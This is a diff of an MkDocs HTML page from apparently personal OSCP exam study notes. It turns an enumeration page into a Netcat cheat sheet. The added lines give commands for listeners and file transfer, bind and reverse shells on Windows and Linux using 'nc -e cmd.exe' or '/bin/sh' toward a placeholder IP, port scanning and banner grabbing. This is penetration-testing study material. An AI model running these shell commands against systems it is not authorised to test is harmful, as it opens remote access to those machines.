@@ -6,12 +6,12 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         
         <meta name="author" content="Daniel Britt">
-        <link rel="canonical" href="https://daniel-britt.github.io/OSCP-Notes/enumeration/">
-        <link rel="shortcut icon" href="../img/favicon.ico">
-        <title>Enumeration - OSCP Notes</title>
-        <link href="../css/bootstrap-custom.min.css" rel="stylesheet">
-        <link href="../css/font-awesome.min.css" rel="stylesheet">
-        <link href="../css/base.css" rel="stylesheet">
+        <link rel="canonical" href="https://daniel-britt.github.io/OSCP-Notes/tools/netcat/">
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>Netcat - OSCP Notes</title>
+        <link href="../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
         <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
         <!--[if lt IE 9]>
@@ -19,8 +19,8 @@
             <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
         <![endif]-->
 
-        <script src="../js/jquery-1.10.2.min.js" defer></script>
-        <script src="../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../js/bootstrap-3.0.3.min.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
         <script>hljs.initHighlightingOnLoad();</script> 
     </head>
@@ -39,7 +39,7 @@
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                     </button>
-                    <a class="navbar-brand" href="..">OSCP Notes</a>
+                    <a class="navbar-brand" href="../..">OSCP Notes</a>
                 </div>
 
                 <!-- Expanded navigation -->
@@ -47,29 +47,29 @@
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
                             <li >
-                                <a href="../useful links/">Useful Links</a>
-                            </li>
-                            <li class="active">
-                                <a href="./">Enumeration</a>
+                                <a href="../../useful links/">Useful Links</a>
                             </li>
                             <li >
-                                <a href="../shells/">Shells</a>
+                                <a href="../../enumeration/">Enumeration</a>
                             </li>
-                            <li class="dropdown">
+                            <li >
+                                <a href="../../shells/">Shells</a>
+                            </li>
+                            <li class="dropdown active">
                                 <a href="#" class="dropdown-toggle" data-toggle="dropdown">Tools <b class="caret"></b></a>
                                 <ul class="dropdown-menu">
                                     
 <li >
-    <a href="../tools/">Tools</a>
+    <a href="../">Tools</a>
 </li>
                                     
-<li >
-    <a href="../tools/netcat/">Netcat</a>
+<li class="active">
+    <a href="./">Netcat</a>
 </li>
                                 </ul>
                             </li>
                             <li >
-                                <a href="../about/">About</a>
+                                <a href="../../about/">About</a>
                             </li>
                         </ul>
 
@@ -80,12 +80,12 @@
                             </a>
                         </li>
                             <li >
-                                <a rel="next" href="../useful links/">
+                                <a rel="next" href="../">
                                     <i class="fa fa-arrow-left"></i> Previous
                                 </a>
                             </li>
                             <li >
-                                <a rel="prev" href="../shells/">
+                                <a rel="prev" href="../../about/">
                                     Next <i class="fa fa-arrow-right"></i>
                                 </a>
                             </li>
@@ -97,18 +97,62 @@
         <div class="container">
                 <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
     <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#smpt">SMPT</a></li>
-        <li class="main "><a href="#snmp">SNMP</a></li>
-        <li class="main "><a href="#netbios">NetBios</a></li>
-        <li class="main "><a href="#sql">SQL</a></li>
+        <li class="main active"><a href="#general-listener">General Listener</a></li>
+        <li class="main "><a href="#transfer-a-file">Transfer a file</a></li>
+        <li class="main "><a href="#set-up-a-netcat-bind-shell-windows">Set up a Netcat Bind Shell (Windows)</a></li>
+        <li class="main "><a href="#set-up-a-netcat-bind-shell-linux">Set up a Netcat Bind Shell (Linux)</a></li>
+        <li class="main "><a href="#set-up-a-netcat-reverse-shell-windows">Set up a Netcat Reverse Shell (Windows)</a></li>
+        <li class="main "><a href="#set-up-a-netcat-reverse-shell-linux">Set up a Netcat Reverse Shell (Linux)</a></li>
+        <li class="main "><a href="#netcat-as-a-port-scanner">Netcat as a Port Scanner</a></li>
+        <li class="main "><a href="#netcat-as-a-banner-grabber">Netcat as a Banner Grabber</a></li>
     </ul>
 </div></div>
                 <div class="col-md-9" role="main">
 
-<h2 id="smpt">SMPT</h2>
-<h2 id="snmp">SNMP</h2>
-<h2 id="netbios">NetBios</h2>
-<h2 id="sql">SQL</h2></div>
+<h1 id="general-listener">General Listener</h1>
+<p>Unless otherwise noted, most of these will require an established listener:</p>
+<pre><code>nc -nvlp 1337
+</code></pre>
+
+<h1 id="transfer-a-file">Transfer a file</h1>
+<hr />
+<p>Sender</p>
+<pre><code>nc -nv &lt;IP Address&gt; &lt; input.txt
+</code></pre>
+
+<p>Recipient </p>
+<pre><code>nc -lvp 4444 &gt;output.txt
+</code></pre>
+
+<h1 id="set-up-a-netcat-bind-shell-windows">Set up a Netcat Bind Shell (Windows)</h1>
+<hr />
+<pre><code>nc -lvp 4444 -e cmd.exe
+</code></pre>
+
+<h1 id="set-up-a-netcat-bind-shell-linux">Set up a Netcat Bind Shell (Linux)</h1>
+<hr />
+<pre><code>nc -lvp 4444 -e /bin/sh
+</code></pre>
+
+<h1 id="set-up-a-netcat-reverse-shell-windows">Set up a Netcat Reverse Shell (Windows)</h1>
+<hr />
+<pre><code>nc -nv &lt;IP Address&gt; 443 -e cmd.exe
+</code></pre>
+
+<h1 id="set-up-a-netcat-reverse-shell-linux">Set up a Netcat Reverse Shell (Linux)</h1>
+<hr />
+<pre><code>nc -nv &lt;IP Address&gt; 443 -e /bin/sh
+</code></pre>
+
+<h1 id="netcat-as-a-port-scanner">Netcat as a Port Scanner</h1>
+<hr />
+<pre><code>nc -z &lt;IP Address&gt; &lt;Port Range in abc - xyz format&gt;
+</code></pre>
+
+<h1 id="netcat-as-a-banner-grabber">Netcat as a Banner Grabber</h1>
+<hr />
+<pre><code>echo &quot;&quot; | nc -nv -w1 &lt;IP Address&gt; &lt;Ports&gt;
+</code></pre></div>
         </div>
 
         <footer class="col-md-12">
@@ -117,11 +161,11 @@
             <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
         </footer>
         <script>
-            var base_url = "..",
+            var base_url = "../..",
                 shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
         </script>
-        <script src="../js/base.js" defer></script>
-        <script src="../search/main.js" defer></script>
+        <script src="../../js/base.js" defer></script>
+        <script src="../../search/main.js" defer></script>
 
         <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
     <div class="modal-dialog">
